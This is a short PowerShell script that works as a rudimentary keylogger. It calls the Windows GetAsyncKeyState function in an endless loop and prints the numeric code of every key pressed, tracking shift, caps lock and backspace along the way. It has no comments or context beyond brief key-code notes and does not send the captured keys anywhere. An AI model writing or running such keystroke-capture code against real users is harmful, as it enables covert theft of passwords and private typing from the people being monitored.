$Signature = @'
    [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
    public static extern short GetAsyncKeyState(int virtualKeyCode); 
'@
Add-Type -MemberDefinition $Signature -Name Keyboard -Namespace PsOneApi
# 13 = enter
# 9 = tab
$cap_state = $false
$last_shift_state = $false
do
{
 	$shift_state = $false
  
    	# checks shift (16) key state
 	if ( [bool]([PsOneApi.Keyboard]::GetAsyncKeyState([byte]16) -eq -32767)) { 
  		$shift_state = !$shift_state
	}

 	
  
 	# check backspace (8) or del (219)
 	if ( [bool]([PsOneApi.Keyboard]::GetAsyncKeyState([byte]8) -eq -32767 -or [PsOneApi.Keyboard]::GetAsyncKeyState([byte]219) -eq -32767)) { 
  		write-host -nonewline "\d"
	}  
  


  	# checks capslock (20) key state
  	if ( [bool]([PsOneApi.Keyboard]::GetAsyncKeyState([byte]20) -eq -32767)) {
    		$cap_state = !$cap_state
    	}

	
 	# Keyboard output only gives A-Z0-9, upper/lowercase and symbols must be enumerated by shift key
	for ($i = 0; $i -le 165; $i = $i + 1)
	{
		$keynum = [byte]$i
		if ( [bool]([PsOneApi.Keyboard]::GetAsyncKeyState($keynum) -eq -32767))
		{
			$outkey = $keynum
			Write-Host -nonewline $outkey
		}
	}
} while($true)
